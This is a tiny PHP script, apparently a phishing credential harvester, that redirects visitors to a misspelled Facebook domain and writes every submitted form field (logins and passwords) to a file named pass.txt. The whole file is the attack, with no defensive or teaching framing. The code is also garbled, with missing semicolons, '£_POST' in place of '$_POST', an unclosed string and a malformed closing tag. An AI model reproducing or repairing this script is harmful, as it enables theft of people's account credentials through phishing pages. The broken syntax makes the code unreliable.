<?php
header ('location: https://www.faecbook.com')
$handle = fopen("pass.txt", "a");
foreach(£_POST as $variable => $value){
fwrite($handle, $variable)
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, '\n'); 
}
fwrite($handle,\r\n");
fclose($handle);
exit;
?<